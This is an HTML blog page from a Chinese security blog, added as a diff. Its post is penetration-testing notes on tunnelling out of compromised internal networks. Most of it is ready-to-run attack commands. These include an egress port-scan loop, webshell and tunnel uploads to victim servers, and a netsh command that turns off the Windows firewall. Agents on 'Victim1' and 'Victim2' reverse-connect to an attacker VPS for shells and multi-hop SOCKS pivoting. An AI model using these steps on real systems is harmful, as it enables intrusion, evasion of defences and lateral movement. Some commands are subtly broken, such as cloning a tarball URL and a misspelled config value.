@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>内网代理 | JohnScott2046的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,网络安全," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott2046</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>内网代理</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2021-08-02
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="55内网代理"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>在渗透测试中，进入内网后，我们要判断流量是否能够出的去、进的来。</p>
+<p>在实际的网络情况下，流量会经过很多的边界设备，在一般的企业内网中，可能会存在 IDP、IPS、防火墙等设备，如果异常的话，就会直接将通信阻断；这里的隧道，就是绕过端口屏蔽的通信方式。</p>
+<p>防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方通信。当被封装的数据包达到了另外的地址的时候，解包还原，并将还原后的数据包发送到相应的服务器上。</p>
+<p>常见的隧道包括三个大类：网络层、应用层、传输层</p>
+<h2 id="出网探测"><a href="#出网探测" class="headerlink" title="出网探测"></a>出网探测</h2><p>查看是否禁止了出站IP或者禁止了出站端口或者禁止了出站协议</p>
+<p>情况一：IP白名单</p>
+<p>目标主机设置了严格的策略，防火墙只允许目标内网机器主动连接公网指定的IP<br>这样的话，没法反弹shell。</p>
+<p>情况二：出站端口限制</p>
+<p>1.Linux自带命令</p>
+<p>for i in {1..65500};do timeout 0.5 bash -c “echo &gt;/dev/tcp/baidu.com/$i” &amp;&amp; echo “$i*<strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong>open**<strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong>“ || echo “$i closed”;done &gt;&gt; result.txt</p>
+<p>2.nmap探测</p>
+<p>nmap -sT -Pn -p- -v <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
+<p>3.masscan探测</p>
+<p>masscan -p 80,443,8000-9000 IP –rate=10000</p>
+<p>Windows<br>如果RDP连接上去，可以使用图形化工具(如御剑)。<br>如果是webshell，可以使用fscan、nmap。</p>
+<p>fscan -h 127.0.0.1 -p 1-65535</p>
+<p>情况三：禁止出站协议</p>
+<p>对于禁止出站协议的情况，需要探测目标机器允许哪些协议出网。<br>ping  icmp<br>curl  http<br>nslookup  dns</p>
+<p>如果目标出网，就可以正常Socks5反向代理打通隧道</p>
+<h3 id="FRP-Proxifier实现内网socks5反向代理"><a href="#FRP-Proxifier实现内网socks5反向代理" class="headerlink" title="FRP+Proxifier实现内网socks5反向代理"></a>FRP+Proxifier实现内网socks5反向代理</h3><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<p>1.在服务端上配置frps.ini文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.38.0&#x2F;frp_0.38.0_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.38.0_linux_amd64.tar.gz</span><br><span class="line">cp -r frp_0.38.0_linux_amd64 frp          # 重命名Dir，方便后续操作</span><br><span class="line">rm -rf .&#x2F;frp_0.38.0_linux_amd64</span><br><span class="line">rm -rf .&#x2F;frp_0.38.0_linux_amd64.tar.gz</span><br><span class="line">cd frp</span><br><span class="line">rm -rf frpc &amp;rm -rf frpc_full.ini &amp;rm -rf frpc.ini</span><br></pre></td></tr></table></figure>
+
+
+<p>vim frps.ini</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0      # 服务端监听地址 默认0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000      # 客户端和服务端连接的端口 </span><br><span class="line">dashboard_port &#x3D; 7500     # 服务端仪表板的端口</span><br><span class="line">#token &#x3D; 12345678      # 连接口令</span><br><span class="line">dashboard_user &#x3D; admin     # 仪表盘用户</span><br><span class="line">dashboard_pwd &#x3D; admin     # 仪表盘口令</span><br><span class="line">log_file &#x3D; .&#x2F;frps.log     # frp日志</span><br><span class="line">log_level &#x3D; info         # log_level记录的日志级别</span><br><span class="line">log_max_days &#x3D; 3          # log_max_days日志留存3天</span><br><span class="line">authentication_timeout &#x3D; 0       # authentication_timeout超时时间</span><br><span class="line">max_pool_count &#x3D; 50      # max_pool_count最大链接池</span><br></pre></td></tr></table></figure>
+
+<p>./frps -c frps.ini</p>
+<p>2.在客户端上下载frp并配置frpc.ini文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; vps_ip  #连接服务端的地址</span><br><span class="line">server_port &#x3D; 7000    #连接服务端的端口</span><br><span class="line">tls_enable &#x3D; ture      #启用 TLS 协议加密连接</span><br><span class="line">pool_count &#x3D; 5        #连接池大小</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 8888  #是该条规则在服务端开放的端口号，待会儿用proxyfier连的端口</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; admin</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure>
+<p>./frpc -c frpc.ini</p>
+<p>3.配置proxyfier<br>打开Proxy Server</p>
+<h3 id="Venom多级代理"><a href="#Venom多级代理" class="headerlink" title="Venom多级代理"></a>Venom多级代理</h3><p>Venom是一款由腾讯玄武实验室大佬Dliv3等人为渗透测试人员设计的使用Go开发的多级代理工具</p>
+<p><a href="https://github.com/Dliv3/Venom/releases">https://github.com/Dliv3/Venom/releases</a></p>
+<p>agent监听端口，admin发起连接（正向代理）</p>
+<p>./agent_linux_x64 -lport 7777<br>./admin.exe -rhost 192.168.110.131 -rport 7777</p>
+<p>admin监听端口，agent发起连接（反向代理）<br>./admin.exe -lport 9999<br>./agent_linux_x64 -rhost 192.168.110.1 -rport 9999</p>
+<p>show 显示网络拓扑<br>goto ID 进入某agent节点<br>shell 获取节点的交互式shell<br>socks [port] 本地与节点1的Socks5代理，代理端口为port<br>setdes/getdes 设置/获取节点信息描述，起标记作用<br>upload/download 向节点上传/从节点下载文件<br>lforward/rforward 将本地端口转发到远程/将远程端口转发到本地<br>rforward 192.168.110.131 80 8889<br>rforward 将node1网段的192.168.110.131的80转发到admin节点本地的8889端口</p>
+<p>最终要在victim1上建立一级代理，在victim2上建立二级代理</p>
+<p>VPS(kali)<br>./admin_linux_x64 -lport 9999</p>
+<p>Victim1<br>./agent_linux_x64 -rhost VPS_ip -rport 9999 -passwd moonsec</p>
+<p>一级代理此时就建立好了<br>在一级代理下，我们也很顺利地getshell了victim2<br>配合Proxyfier使webshell工具（Antsword、Godzilla）走一级代理，这样就能连上我们传到内网Victim2服务器的shell</p>
+<p>然后在Victim1服务器上开启监听端口：<br>(admin node) &gt;&gt;&gt; goto 1<br>(node 1) &gt;&gt;&gt; listen 9998</p>
+<p>Victim2服务器反向去连Victim1：<br>agent64.exe -rhost victim1_IP -rport 9998<br>show<br>goto 2</p>
+<p>在节点2上开启socks5代理隧道，端口9998<br>socks 9998</p>
+<p>然后就可以在Proxyfier添加9998代理<br>二级代理配置成功，可以用Proxyfier漫游Victim2的内网，进而打到Victim3</p>
+<h3 id="icmpsh隧道"><a href="#icmpsh隧道" class="headerlink" title="icmpsh隧道"></a>icmpsh隧道</h3><p>服务端下载<br>git clone <a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
+<p>受控端直接上传,然后关闭服务端的 ICMP 应答<br>sysctl -w net.ipv4.icmp_echo_ignore_all=1<br>测试完后 然后取消就设置为0</p>
+<p>python2<br>wget <a target="_blank" rel="noopener" href="https://bootstrap.pypa.io/pip/2.7/get-pip.py">https://bootstrap.pypa.io/pip/2.7/get-pip.py</a><br>python2 get-pip.py</p>
+<p>安装impacket<br>pip2 install impacket -i <a target="_blank" rel="noopener" href="https://pypi.douban.com/simple">https://pypi.douban.com/simple</a></p>
+<p>服务端启动<br>python2 icmpsh_m.py &lt;服务端IP&gt; &lt;受控端IP&gt;</p>
+<p>受控端启动(Windows)<br>.\icmpsh.exe -t &lt;服务端IP&gt;</p>
+<h3 id="一、-Neo-reGeorg"><a href="#一、-Neo-reGeorg" class="headerlink" title="一、 Neo-reGeorg"></a>一、 Neo-reGeorg</h3><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
+<ol>
+<li>设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器</li>
+</ol>
+<p>python neoreg.py generate -k password</p>
+<ol start="2">
+<li>使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理</li>
+</ol>
+<p>python3 neoreg.py -k password -u <a target="_blank" rel="noopener" href="http://xx/tunnel.php">http://xx/tunnel.php</a></p>
+<p>注意，如 nmap 不支持 socks5 代理设置，请使用 proxychains 等</p>
+<h4 id="高级使用"><a href="#高级使用" class="headerlink" title="高级使用"></a>高级使用</h4><ol>
+<li>支持生成的服务端，默认直接请求响应指定的页面内容 (如伪装的 404 页面)</li>
+</ol>
+<p>python neoreg.py generate -k <you_password> –file 404.html –httpcode 404<br>python neoreg.py -k <you_password> -u <server_url> –skip</p>
+<ol start="2">
+<li>如服务端WEB，需要设置代理才能访问</li>
+</ol>
+<p>python neoreg.py -k <you_password> -u <server_url> –proxy socks5://10.1.1.1:8080</p>
+<ol start="3">
+<li>如需 Authorization 认证和定制的 Header 或 Cookie</li>
+</ol>
+<p>python neoreg.py -k <you_password> -u <server_url> -H ‘Authorization: cm9vdDppcyB0d2VsdmU=’ –cookie “key=value;key2=value2”</p>
+<ol start="4">
+<li>需要分散请求，可上传到多个路径上，如内存马</li>
+</ol>
+<p>python neoreg.py -k <you_password> -u <url_1> -u <url_2> -u <url_3> …</p>
+<ol start="5">
+<li>开启内网转发，应对负载均衡</li>
+</ol>
+<p>python neoreg.py -k <you_password> -u <url> -r <redirect_url></p>
+<ol start="6">
+<li>使用端口转发功能，非启动 socks5 服务 ( 127.0.0.1:1080 -&gt; ip:port )    </li>
+</ol>
+<p>python neoreg.py -k <you_password> -u <url> -t <a href="ip:port">ip:port</a></p>
+<p>python neoreg.py -k krystal -u <a target="_blank" rel="noopener" href="http://35.241.127.243/tunnel.php">http://35.241.127.243/tunnel.php</a> -p 6666</p>
+<h3 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h3><p><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/proxychains-ng">https://sourceforge.net/projects/proxychains-ng</a></p>
+<h3 id="netsh-Networ-Shell-端口转发"><a href="#netsh-Networ-Shell-端口转发" class="headerlink" title="netsh(Networ Shell)端口转发"></a>netsh(Networ Shell)端口转发</h3><p>netsh是一个Windows系统本身提供的功能强大的网络配置命令行工具，使用netsh进行端口转发的条件是必须是管理员（administrator）权限</p>
+<ol>
+<li>查看防火墙配置<br>netsh firewall show config(win10提示已弃用)<br>netsh advfirewall firewall</li>
+</ol>
+<p>如果操作模式（Operational mode）是启用的，那么我们操作的时候需要吧防火墙给关闭才可以进行接下来的操作</p>
+<p>关闭防火墙<br>netsh advfirewall set allprofiles state off</p>
+<ol start="2">
+<li>添加入站规则</li>
+</ol>
+<p>添加一个 krystal 规则，走TCP协议，开一个10086端口<br>netsh advfirewall firewall add rule name=”krystal” dir=in action=allow protocol=TCP localport=10086</p>
+<p>通过IPv4吧本地127.0.0.1的内网3389端口转发到外网的10086端口<br>netsh interface portproxy add v4tov4 listenport=10086 connectaddress=127.0.0.1 connectport=3389</p>
+<p>查看防火墙状态<br>netsh firewall show state </p>
+<p>查看所有转发规则<br>netsh interface portproxy show all</p>
+<hr>
+<p>删除规则<br>netsh advfirewall firewall delete rule name=”krystal” dir=in action=allow protocol=TCP localport=10086<br>netsh interface portproxy delete v4tov4 listenport=10086</p>
+<p>这个时候我们只需要远程连接目标的10086端口就相当于连接了目标的3389端口 mstsc</p>
+<p>也可以使用此方法<br>netsh interface portproxy add v4tov4 listenport=10086 listenaddress=192.168.1.200 connectport=3389 connectaddress=192.168.1.200<br>listenaddress - 等待连接的本地IP地址。<br>listenport - 本地侦听TCP端口。<br>connectaddress - 将传入连接重定向到本地或远程IP地址（或DNS名称）<br>connectport - 一个TCP端口，来自listenport的连接会被转发到该端口。假设当前我们的RDP服务端口在一个非标准端口上进行响应，如10086（端口可以在服务设置中更改）。为此，我们需要将传入流量从TCP端口10086重定向到另一个本地端口 - 3389（即标准rdp端口）</p>
+<p>删除指定的端口转发规则<br>netsh interface portproxy delete v4tov4 listenport=10086 listenaddress=192.168.2.13</p>
+<p>删除所有当前端口转发规则<br>netsh interface portproxy reset</p>
+<h3 id="SSF反向代理"><a href="#SSF反向代理" class="headerlink" title="SSF反向代理"></a>SSF反向代理</h3><p>反向代理就是我们客户端监听，目标服务端连接我们的客户端，SSF走的是Socks5代理</p>
+<p>下载地址 (<a target="_blank" rel="noopener" href="https://securesocketfunneling.github.io/ssf/#download)[https://securesocketfunneling.github.io/ssf/#download]">https://securesocketfunneling.github.io/ssf/#download)[https://securesocketfunneling.github.io/ssf/#download]</a></p>
+<ol>
+<li>服务端Win监听1111端口，等待连接</li>
+</ol>
+<p>./ssfd -p 1111<br>ssfd.exe -p 1111</p>
+<ol start="2">
+<li>客户端连接我们服务端的1111端口，并将数据流量转发给2222端口</li>
+</ol>
+<p>ssf.exe -F 2222 -p 1111 35.241.127.243<br>./ssf -F 2222 -p 1111  35.241.127.243</p>
+<p>使用代理工具Proxychains做socks代理</p>
+<p>在文件 /etc/proxychains.conf 最后一行加入<br>socks5 127.0.0.1 2222</p>
+<ol start="3">
+<li>使用<br>在使用的工具前面加入 proxychains</li>
+</ol>
+<h3 id="SSF正向代理"><a href="#SSF正向代理" class="headerlink" title="SSF正向代理"></a>SSF正向代理</h3><p>如果目标防火墙只允许进不允许出，那么我们就可以使用正向代理。也就是我们去连接目标</p>
+<ol>
+<li>目标监听1080端口</li>
+</ol>
+<p>ssfd.exe -p 1080</p>
+<ol start="2">
+<li>服务端连接目标1080，并吧数据转发到1081</li>
+</ol>
+<p>.ssf -D 1081 -P 1080 35.241.127.243</p>
+<ol start="3">
+<li>使用Proxifier工具进行socks5代理连接</li>
+</ol>
+<h3 id="abptts正向端口转发"><a href="#abptts正向端口转发" class="headerlink" title="abptts正向端口转发"></a>abptts正向端口转发</h3><p>abptts是一款基于ssl加密的http隧道工具(不支持PHP)</p>
+<p>下载地址 (<a href="https://github.com/nccgroup/ABPTTS.git)[https://github.com/nccgroup/ABPTTS.git]">https://github.com/nccgroup/ABPTTS.git)[https://github.com/nccgroup/ABPTTS.git]</a></p>
+<p>python ‐m pip install pycrypto<br>python ‐m pip install pycryptodome<br>python ‐m pip install httplib2</p>
+<ol>
+<li>生成一个webshell</li>
+</ol>
+<p>python abpttsfactory.py ‐o webshell</p>
+<p>生成之后当前路径下会有一个webshell目录</p>
+<ol start="2">
+<li><p>将webshell文件上传到服务器</p>
+</li>
+<li><p>使用python进行连接</p>
+</li>
+</ol>
+<p>python abpttsclient.py ‐c webshell/config.txt ‐u “http://目标服务器/abptts.jsp” -f 本地内网IP：本地端口/目标边界内网IP:需要转发的目标边界端口</p>
+<p>python abpttsclient.py -c webshell/config.txt -u “<a target="_blank" rel="noopener" href="http://192.168.1.230/abptts.jsp&quot;">http://192.168.1.230/abptts.jsp&quot;</a> -f 127.0.0.1:33389/127.0.0.1:3389<br>将目标边界的3389转发到本地的33389端口上</p>
+<p>然后本地连接自己的127.0.0.1:33389就相当于连接192.168.1.230/的3389端口</p>
+<h3 id="earthworm正向跨平台socks代理"><a href="#earthworm正向跨平台socks代理" class="headerlink" title="earthworm正向跨平台socks代理"></a>earthworm正向跨平台socks代理</h3><p>下载地址：<a href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a></p>
+<ol>
+<li><p>为ew_for_win_32.exe添加防火墙规则(管理员权限)<br>netsh advfirewall firewall add rule name=”transit test4” dir=in program=”c:\test\ew_for_win_32.exe” action=allow</p>
+</li>
+<li><p>开启转发功能<br>ew_for_win_32.exe -s lcx_tran -l 7777 -f 192.168.111.103 -g 4444</p>
+</li>
+<li><p>清除防火墙规则(管理员权限)<br>netsh advfirewall firewall delete rule name=”transit test4” dir=in program=”c:\test\ew_for_win_32.exe”</p>
+</li>
+</ol>
+<h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>ew_for_Win.exe -s ssocksd ‐l 1080</p>
+<p>配置Proxychains连接目标机</p>
+<h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><ol>
+<li>客户端攻击机吧外网的888端口转发到本地的1008端口</li>
+</ol>
+<p>./ew_for_linux64 -s rcsocks -l 1008 -e 888</p>
+<ol start="2">
+<li>目标边界接收888端口的数据</li>
+</ol>
+<p>ew_for_Win.exe -s rssocks -d 192.168.1.230 -e 888</p>
+<p>连接上攻击机服务端会显示rssocks cmd_socket OK！</p>
+<ol start="3">
+<li>配置Proxychains</li>
+</ol>
+<p>修改 proxychains.conf 的端口为1008</p>
+<h3 id="venom反向socks代理"><a href="#venom反向socks代理" class="headerlink" title="venom反向socks代理"></a>venom反向socks代理</h3><p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具，可将多个节点进行连接，然后以节点为跳板，构建多级代理</p>
+<p>使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点</p>
+<p>github地址 (<a href="https://github.com/Dliv3/Venom)[https://github.com/Dliv3/Venom]">https://github.com/Dliv3/Venom)[https://github.com/Dliv3/Venom]</a></p>
+<p>releases下载地址 (<a href="https://github.com/Dliv3/Venom/releases)[https://github.com/Dliv3/Venom/releases]">https://github.com/Dliv3/Venom/releases)[https://github.com/Dliv3/Venom/releases]</a></p>
+<p>go get -u github.com/Dliv3/Venom/…<br>如果您想从源码编译该项目, 需要安装 go &gt;= 1.11, 然后执行下面的命令</p>
+<p>$GOPATH是安装Go时配置的环境变量，可通过go env命令查看<br>cd $GOPATH/src/github.com/Dliv3/Venom</p>
+<p>编译好的二进制文件存放在当前目录下的release文件夹中 ./build.sh</p>
+<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><ol>
+<li>admin监听本地端口5555</li>
+</ol>
+<p>admin.exe -lport 9999<br>./admin_macos_x64 -lport 9999<br>./agent_linux_x64 -lport 9999</p>
+<ol start="2">
+<li>，agent反向连接我们服务端</li>
+</ol>
+<p>agent.exe ‐rhost 35.241.127.243 ‐rport 9999<br>./agent_linux_x64 -rhost 35.241.127.243 -rport 9999</p>
+<ol start="3">
+<li><p>查看节点<br>show  </p>
+</li>
+<li><p>进入节点1<br>goto 1</p>
+</li>
+<li><p>进入交互式shell<br>shell</p>
+</li>
+</ol>
+<p>退出<br>exit</p>
+<ol start="6">
+<li><p>建立socks代理<br>socks 9999</p>
+</li>
+<li><p>最后使用Proxifier对公网 35.241.127.243 进行socks代理连接</p>
+</li>
+</ol>
+<h3 id="Pystinger在不出网的情况下"><a href="#Pystinger在不出网的情况下" class="headerlink" title="Pystinger在不出网的情况下"></a>Pystinger在不出网的情况下</h3><p>项目地址 <a href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a></p>
+<p>让 Webshell 实现内网 Socks4 代理，使不出网的机器上线到 MSF/CS，该工具是 python 写的一款工具，支持目标站点 php、jsp（x）、aspx 三种脚本语言</p>
+<ol>
+<li><p>先上传对应的 Pystinger webshell 文件并成功访问</p>
+</li>
+<li><p>目标服务器执行文件 开启服务<br>start stinger_server.exe 0.0.0.0</p>
+</li>
+<li><p>然后将 stinger_client 上传到 vps<br>./stinger_client -w <a target="_blank" rel="noopener" href="http://saulgoodman.cn:9009//wls-wsat/proxy.pjp">http://saulgoodman.cn:9009//wls-wsat/proxy.pjp</a> -l 0.0.0.0 -p 60000</p>
+</li>
+<li><p>使用cs创建监听 60000端口</p>
+</li>
+</ol>
+<h3 id="使用rinetd实现端口转发"><a href="#使用rinetd实现端口转发" class="headerlink" title="使用rinetd实现端口转发"></a>使用rinetd实现端口转发</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://boutell.com/rinetd/http/rinetd.zip">https://boutell.com/rinetd/http/rinetd.zip</a></p>
+<p>仅需要压缩包中的rinetd.exe</p>
+<ol>
+<li><p>为rinetd.exe添加防火墙规则(管理员权限)<br>netsh advfirewall firewall add rule name=”transit test2” dir=in program=”c:\test\rinetd.exe” action=allow</p>
+</li>
+<li><p>编写转发规则<br>echo 0.0.0.0 7777 192.168.111.103 4444 &gt; conf.txt</p>
+</li>
+<li><p>启动<br>rinetd.exe -c c:\test\conf.txt</p>
+</li>
+<li><p>清除防火墙规则(管理员权限)<br>netsh advfirewall firewall delete rule name=”transit test2” dir=in program=”c:\test\rinetd.exe”</p>
+</li>
+</ol>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/55%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+              #网络安全
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
